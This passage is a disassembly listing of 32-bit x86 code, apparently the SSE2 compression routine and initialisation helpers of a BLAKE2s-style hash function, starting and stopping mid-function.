  4042bc:	66 0f fe d3          	paddd  %xmm3,%xmm2
  4042c0:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4042c4:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  4042c9:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  4042cd:	66 0f 6e db          	movd   %ebx,%xmm3
  4042d1:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4042d5:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  4042da:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  4042df:	66 0f ef e9          	pxor   %xmm1,%xmm5
  4042e3:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  4042e8:	66 0f 6e eb          	movd   %ebx,%xmm5
  4042ec:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4042f0:	66 0f 6e f1          	movd   %ecx,%xmm6
  4042f4:	66 0f 6e ff          	movd   %edi,%xmm7
  4042f8:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  4042fd:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404301:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404305:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404309:	66 0f fe e7          	paddd  %xmm7,%xmm4
  40430d:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404311:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404315:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404319:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  40431e:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  404323:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404327:	66 0f fe d0          	paddd  %xmm0,%xmm2
  40432b:	66 0f ef ca          	pxor   %xmm2,%xmm1
  40432f:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404333:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404338:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  40433d:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404341:	66 0f 6e db          	movd   %ebx,%xmm3
  404345:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  404349:	66 0f 6e f3          	movd   %ebx,%xmm6
  40434d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404351:	66 0f 6e fb          	movd   %ebx,%xmm7
  404355:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  404359:	66 0f 6e ee          	movd   %esi,%xmm5
  40435d:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404361:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404365:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404369:	66 0f fe e7          	paddd  %xmm7,%xmm4
  40436d:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404371:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404375:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404379:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  40437e:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404383:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404387:	66 0f fe d3          	paddd  %xmm3,%xmm2
  40438b:	66 0f ef ca          	pxor   %xmm2,%xmm1
  40438f:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  404393:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  404398:	66 0f 6e db          	movd   %ebx,%xmm3
  40439c:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4043a0:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  4043a5:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  4043aa:	66 0f ef e9          	pxor   %xmm1,%xmm5
  4043ae:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  4043b3:	66 0f 6e eb          	movd   %ebx,%xmm5
  4043b7:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4043bb:	66 0f 6e f3          	movd   %ebx,%xmm6
  4043bf:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4043c3:	66 0f 6e fb          	movd   %ebx,%xmm7
  4043c7:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  4043cc:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4043d0:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4043d4:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4043d8:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4043dc:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4043e0:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4043e4:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4043e8:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  4043ed:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4043f1:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  4043f6:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4043fa:	66 0f fe d0          	paddd  %xmm0,%xmm2
  4043fe:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404402:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404406:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  40440b:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  404410:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404414:	66 0f 6e db          	movd   %ebx,%xmm3
  404418:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40441c:	66 0f 6e eb          	movd   %ebx,%xmm5
  404420:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  404424:	66 0f 6e f3          	movd   %ebx,%xmm6
  404428:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  40442c:	66 0f 6e fb          	movd   %ebx,%xmm7
  404430:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  404434:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404438:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  40443c:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404440:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404444:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404448:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40444c:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404450:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404455:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  40445a:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40445e:	66 0f fe d3          	paddd  %xmm3,%xmm2
  404462:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404466:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  40446a:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  40446f:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  404474:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404478:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  40447d:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  404482:	66 0f 6e eb          	movd   %ebx,%xmm5
  404486:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40448a:	66 0f 6e de          	movd   %esi,%xmm3
  40448e:	66 0f 6e fb          	movd   %ebx,%xmm7
  404492:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  404496:	66 0f 6e f0          	movd   %eax,%xmm6
  40449a:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  40449f:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4044a3:	66 0f 6e e9          	movd   %ecx,%xmm5
  4044a7:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4044ab:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4044af:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4044b3:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4044b7:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4044bb:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4044bf:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  4044c4:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  4044c9:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4044cd:	66 0f fe d0          	paddd  %xmm0,%xmm2
  4044d1:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4044d5:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  4044d9:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  4044de:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  4044e3:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4044e7:	66 0f 6e db          	movd   %ebx,%xmm3
  4044eb:	66 0f 6e f2          	movd   %edx,%xmm6
  4044ef:	66 0f 6e ff          	movd   %edi,%xmm7
  4044f3:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4044f7:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4044fb:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4044ff:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404503:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404507:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40450b:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40450f:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  404514:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404519:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40451d:	66 0f fe d3          	paddd  %xmm3,%xmm2
  404521:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404525:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  404529:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  40452e:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  404533:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404537:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  40453c:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  404541:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  404546:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  40454a:	66 0f 6e eb          	movd   %ebx,%xmm5
  40454e:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  404552:	66 0f 6e f3          	movd   %ebx,%xmm6
  404556:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40455a:	66 0f 6e df          	movd   %edi,%xmm3
  40455e:	66 0f 6e f9          	movd   %ecx,%xmm7
  404562:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404566:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  40456a:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40456e:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404572:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404576:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40457a:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40457e:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  404583:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  404588:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40458c:	66 0f fe d0          	paddd  %xmm0,%xmm2
  404590:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404594:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404598:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  40459d:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  4045a2:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4045a6:	66 0f 6e db          	movd   %ebx,%xmm3
  4045aa:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4045ae:	66 0f 6e eb          	movd   %ebx,%xmm5
  4045b2:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4045b6:	66 0f 6e f3          	movd   %ebx,%xmm6
  4045ba:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  4045be:	66 0f 6e f8          	movd   %eax,%xmm7
  4045c2:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4045c6:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4045ca:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4045ce:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4045d2:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4045d6:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4045da:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4045de:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  4045e3:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  4045e8:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4045ec:	66 0f fe d3          	paddd  %xmm3,%xmm2
  4045f0:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4045f4:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  4045f9:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  4045fd:	66 0f 6e db          	movd   %ebx,%xmm3
  404601:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404605:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  40460a:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  40460f:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404613:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  404618:	66 0f 6e eb          	movd   %ebx,%xmm5
  40461c:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  404620:	66 0f 6e f3          	movd   %ebx,%xmm6
  404624:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404628:	66 0f 6e fb          	movd   %ebx,%xmm7
  40462c:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404630:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  404635:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404639:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  40463d:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404641:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404645:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404649:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40464d:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404651:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  404656:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  40465b:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40465f:	66 0f fe d0          	paddd  %xmm0,%xmm2
  404663:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404667:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  40466b:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404670:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  404675:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404679:	66 0f 6e db          	movd   %ebx,%xmm3
  40467d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404681:	66 0f 6e ea          	movd   %edx,%xmm5
  404685:	66 0f 6e f3          	movd   %ebx,%xmm6
  404689:	66 0f 6e fe          	movd   %esi,%xmm7
  40468d:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404691:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404695:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404699:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40469d:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4046a1:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4046a5:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4046a9:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4046ad:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  4046b2:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  4046b7:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4046bb:	66 0f fe d3          	paddd  %xmm3,%xmm2
  4046bf:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4046c3:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  4046c8:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  4046cc:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  4046d1:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  4046d6:	66 0f ef e9          	pxor   %xmm1,%xmm5
  4046da:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  4046df:	66 0f 6e db          	movd   %ebx,%xmm3
  4046e3:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4046e7:	66 0f 6e eb          	movd   %ebx,%xmm5
  4046eb:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4046ef:	66 0f 6e f3          	movd   %ebx,%xmm6
  4046f3:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  4046f7:	66 0f 6e fb          	movd   %ebx,%xmm7
  4046fb:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4046ff:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  404704:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404708:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  40470c:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404710:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404714:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404718:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40471c:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404720:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  404725:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  40472a:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40472e:	66 0f fe d0          	paddd  %xmm0,%xmm2
  404732:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404736:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  40473a:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  40473f:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  404744:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404748:	66 0f 6e e9          	movd   %ecx,%xmm5
  40474c:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404750:	66 0f 6e db          	movd   %ebx,%xmm3
  404754:	66 0f 6e f2          	movd   %edx,%xmm6
  404758:	66 0f 6e fe          	movd   %esi,%xmm7
  40475c:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404760:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404764:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404768:	66 0f fe e7          	paddd  %xmm7,%xmm4
  40476c:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404770:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404774:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404778:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  40477d:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404782:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404786:	66 0f fe d3          	paddd  %xmm3,%xmm2
  40478a:	66 0f ef ca          	pxor   %xmm2,%xmm1
  40478e:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  404793:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  404797:	66 0f 6e d9          	movd   %ecx,%xmm3
  40479b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40479f:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  4047a4:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  4047a9:	66 0f ef e9          	pxor   %xmm1,%xmm5
  4047ad:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  4047b2:	66 0f 6e e9          	movd   %ecx,%xmm5
  4047b6:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4047ba:	66 0f 6e f1          	movd   %ecx,%xmm6
  4047be:	66 0f 6e f8          	movd   %eax,%xmm7
  4047c2:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  4047c7:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4047cb:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4047cf:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4047d3:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4047d7:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4047db:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4047df:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4047e3:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  4047e8:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  4047ed:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4047f1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4047f5:	66 0f fe d0          	paddd  %xmm0,%xmm2
  4047f9:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4047fd:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404801:	66 0f 6e e8          	movd   %eax,%xmm5
  404805:	8b 44 24 30          	mov    0x30(%esp),%eax
  404809:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  40480e:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404813:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404817:	66 0f 6e f0          	movd   %eax,%xmm6
  40481b:	8b 44 24 34          	mov    0x34(%esp),%eax
  40481f:	66 0f 6e f8          	movd   %eax,%xmm7
  404823:	8b 45 08             	mov    0x8(%ebp),%eax
  404826:	8b 88 f4 00 00 00    	mov    0xf4(%eax),%ecx
  40482c:	66 0f 6e df          	movd   %edi,%xmm3
  404830:	5f                   	pop    %edi
  404831:	5e                   	pop    %esi
  404832:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404836:	5b                   	pop    %ebx
  404837:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  40483b:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40483f:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404843:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404847:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40484b:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40484f:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  404854:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404859:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40485d:	66 0f fe d3          	paddd  %xmm3,%xmm2
  404861:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404865:	66 0f 6f c1          	movdqa %xmm1,%xmm0
  404869:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  40486e:	66 0f 72 d0 07       	psrld  $0x7,%xmm0
  404873:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404877:	66 0f 70 ca 4e       	pshufd $0x4e,%xmm2,%xmm1
  40487c:	66 0f ef e1          	pxor   %xmm1,%xmm4
  404880:	66 0f 6f 4c 24 34    	movdqa 0x34(%esp),%xmm1
  404886:	66 0f ef cc          	pxor   %xmm4,%xmm1
  40488a:	66 0f 7f 09          	movdqa %xmm1,(%ecx)
  40488e:	8b 80 f4 00 00 00    	mov    0xf4(%eax),%eax
  404894:	66 0f 6f 4c 24 44    	movdqa 0x44(%esp),%xmm1
  40489a:	66 0f 70 db 39       	pshufd $0x39,%xmm3,%xmm3
  40489f:	66 0f 70 c0 93       	pshufd $0x93,%xmm0,%xmm0
  4048a4:	83 c0 10             	add    $0x10,%eax
  4048a7:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4048ab:	66 0f ef c8          	pxor   %xmm0,%xmm1
  4048af:	66 0f 7f 08          	movdqa %xmm1,(%eax)
  4048b3:	33 c0                	xor    %eax,%eax
  4048b5:	8b e5                	mov    %ebp,%esp
  4048b7:	5d                   	pop    %ebp
  4048b8:	c2 08 00             	ret    $0x8
  4048bb:	56                   	push   %esi
  4048bc:	68 f0 00 00 00       	push   $0xf0
  4048c1:	8b f1                	mov    %ecx,%esi
  4048c3:	6a 00                	push   $0x0
  4048c5:	56                   	push   %esi
  4048c6:	e8 d5 5a 01 00       	call   0x41a3a0
  4048cb:	83 a6 00 01 00 00 00 	andl   $0x0,0x100(%esi)
  4048d2:	83 c4 0c             	add    $0xc,%esp
  4048d5:	c6 86 04 01 00 00 00 	movb   $0x0,0x104(%esi)
  4048dc:	5e                   	pop    %esi
  4048dd:	c3                   	ret
  4048de:	83 3d 78 e5 44 00 02 	cmpl   $0x2,0x44e578
  4048e5:	56                   	push   %esi
  4048e6:	57                   	push   %edi
  4048e7:	8b f8                	mov    %eax,%edi
  4048e9:	8b f1                	mov    %ecx,%esi
  4048eb:	7c 05                	jl     0x4048f2
  4048ed:	e8 79 ee ff ff       	call   0x40376b
  4048f2:	8b ce                	mov    %esi,%ecx
  4048f4:	e8 c2 ff ff ff       	call   0x4048bb
  4048f9:	33 c0                	xor    %eax,%eax
  4048fb:	8b 90 98 a4 42 00    	mov    0x42a498(%eax),%edx
  404901:	8b 8e f4 00 00 00    	mov    0xf4(%esi),%ecx
  404907:	89 14 08             	mov    %edx,(%eax,%ecx,1)
  40490a:	83 c0 04             	add    $0x4,%eax
  40490d:	83 f8 20             	cmp    $0x20,%eax
  404910:	7c e9                	jl     0x4048fb
  404912:	8b 86 f4 00 00 00    	mov    0xf4(%esi),%eax
  404918:	81 30 20 00 08 02    	xorl   $0x2080020,(%eax)
  40491e:	8b 86 f4 00 00 00    	mov    0xf4(%esi),%eax
  404924:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404928:	31 48 08             	xor    %ecx,0x8(%eax)
  40492b:	8b b6 f4 00 00 00    	mov    0xf4(%esi),%esi
  404931:	81 cf 00 20 00 00    	or     $0x2000,%edi
  404937:	c1 e7 10             	shl    $0x10,%edi
  40493a:	31 7e 0c             	xor    %edi,0xc(%esi)
  40493d:	5f                   	pop    %edi
  40493e:	5e                   	pop    %esi
  40493f:	c2 04 00             	ret    $0x4
  404942:	55                   	push   %ebp
  404943:	8b ec                	mov    %esp,%ebp
  404945:	81 ec 80 00 00 00    	sub    $0x80,%esp
  40494b:	8b 55 08             	mov    0x8(%ebp),%edx
  40494e:	53                   	push   %ebx
  40494f:	56                   	push   %esi
  404950:	57                   	push   %edi
  404951:	6a 10                	push   $0x10
  404953:	8b f0                	mov    %eax,%esi
  404955:	8b 82 f8 00 00 00    	mov    0xf8(%edx),%eax
  40495b:	59                   	pop    %ecx
  40495c:	8d 7d 80             	lea    -0x80(%ebp),%edi
  40495f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404961:	8b b2 f4 00 00 00    	mov    0xf4(%edx),%esi
  404967:	6a 08                	push   $0x8
  404969:	59                   	pop    %ecx
  40496a:	8d 7d c0             	lea    -0x40(%ebp),%edi
  40496d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40496f:	8b 08                	mov    (%eax),%ecx
  404971:	8b 70 04             	mov    0x4(%eax),%esi
  404974:	8b 82 fc 00 00 00    	mov    0xfc(%edx),%eax
  40497a:	8b 10                	mov    (%eax),%edx
  40497c:	8b 40 04             	mov    0x4(%eax),%eax
  40497f:	35 19 cd e0 5b       	xor    $0x5be0cd19,%eax
  404984:	81 f2 ab d9 83 1f    	xor    $0x1f83d9ab,%edx
  40498a:	81 f1 7f 52 0e 51    	xor    $0x510e527f,%ecx
  404990:	81 f6 8c 68 05 9b    	xor    $0x9b05688c,%esi
  404996:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404999:	c7 45 e0 67 e6 09 6a 	movl   $0x6a09e667,-0x20(%ebp)
  4049a0:	c7 45 e4 85 ae 67 bb 	movl   $0xbb67ae85,-0x1c(%ebp)
  4049a7:	c7 45 e8 72 f3 6e 3c 	movl   $0x3c6ef372,-0x18(%ebp)
  4049ae:	c7 45 ec 3a f5 4f a5 	movl   $0xa54ff53a,-0x14(%ebp)
  4049b5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4049b8:	33 c0                	xor    %eax,%eax
  4049ba:	eb 03                	jmp    0x4049bf
  4049bc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4049bf:	0f b6 90 b8 a4 42 00 	movzbl 0x42a4b8(%eax),%edx
  4049c6:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  4049ca:	03 55 d0             	add    -0x30(%ebp),%edx
  4049cd:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  4049d0:	03 da                	add    %edx,%ebx
  4049d2:	0f b6 b8 b9 a4 42 00 	movzbl 0x42a4b9(%eax),%edi
  4049d9:	8b 7c bd 80          	mov    -0x80(%ebp,%edi,4),%edi
  4049dd:	8b d3                	mov    %ebx,%edx
  4049df:	33 d1                	xor    %ecx,%edx
  4049e1:	c1 ca 10             	ror    $0x10,%edx
  4049e4:	01 55 e0             	add    %edx,-0x20(%ebp)
  4049e7:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4049ea:	33 4d e0             	xor    -0x20(%ebp),%ecx
  4049ed:	c1 c9 0c             	ror    $0xc,%ecx
  4049f0:	03 f9                	add    %ecx,%edi
  4049f2:	03 df                	add    %edi,%ebx
  4049f4:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  4049f7:	33 da                	xor    %edx,%ebx
  4049f9:	0f b6 90 ba a4 42 00 	movzbl 0x42a4ba(%eax),%edx
  404a00:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404a04:	03 55 d4             	add    -0x2c(%ebp),%edx
  404a07:	c1 cb 08             	ror    $0x8,%ebx
  404a0a:	01 55 c4             	add    %edx,-0x3c(%ebp)
  404a0d:	01 5d e0             	add    %ebx,-0x20(%ebp)
  404a10:	33 4d e0             	xor    -0x20(%ebp),%ecx
